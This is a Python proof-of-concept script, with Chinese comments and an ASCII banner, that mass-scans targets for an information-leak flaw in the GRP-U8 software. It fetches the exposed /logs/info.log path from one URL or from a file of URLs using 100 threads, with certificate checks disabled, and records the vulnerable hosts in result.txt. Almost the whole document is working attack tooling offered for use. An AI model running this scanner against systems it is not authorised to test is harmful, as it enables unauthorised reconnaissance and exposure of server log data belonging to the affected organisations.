import requests
import argparse
import sys
from multiprocessing.dummy import Pool

# 忽略警告
requests.packages.urllib3.disable_warnings()

# 定义一个打印banner的函数
def banner():
    test = """
███████╗██╗  ██╗██╗   ██╗██╗   ██╗
██╔════╝██║ ██╔╝╚██╗ ██╔╝██║   ██║
███████╗█████╔╝  ╚████╔╝ ██║   ██║
╚════██║██╔═██╗   ╚██╔╝  ██║   ██║
███████║██║  ██╗   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝                                                                                
"""
    print(test)

# 主函数
def main():
    banner()  # 打印banner
    parser = argparse.ArgumentParser(description='GRP-U8GRP information leakage! ')  # 创建解析器对象
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')  # 添加命令行参数选项
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')  # 添加命令行参数选项
    args = parser.parse_args()  # 解析命令行参数

    # 判断输入的参数是单个链接还是文件路径
    if args.url and not args.file:
        poc(args.url)  # 调用poc函数处理单个链接
    elif not args.url and args.file:
        url_list = []  # 存储链接的列表
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 读取文件中的链接并添加到列表中
        # 多线程处理链接
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")  # 打印提示信息

# 漏洞检测函数
def poc(target):
    url = target + '/logs/info.log'  # 构造POC的URL
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }  # 设置请求头
    try:
        res = requests.get(url, headers=headers, verify=False, allow_redirects=True, timeout=10)
        if res.status_code == 200:
            lines = res.text.split('\n')[:100]
            truncated_response = '\n'.join(lines)
            if "INFO" in truncated_response:
                print(f"[+]该url存在漏洞：{target}")
                with open("result.txt", "a", encoding="utf-8") as f:
                    f.write(target + "\n")
            else:
                print("[-]该url不存在漏洞")
        else:
            print(f"[-]请求失败，状态码：{res.status_code}")
    except Exception as e:
        print(f"[*]发生异常：{e}")

if __name__ == '__main__':
    main()  # 调用主函数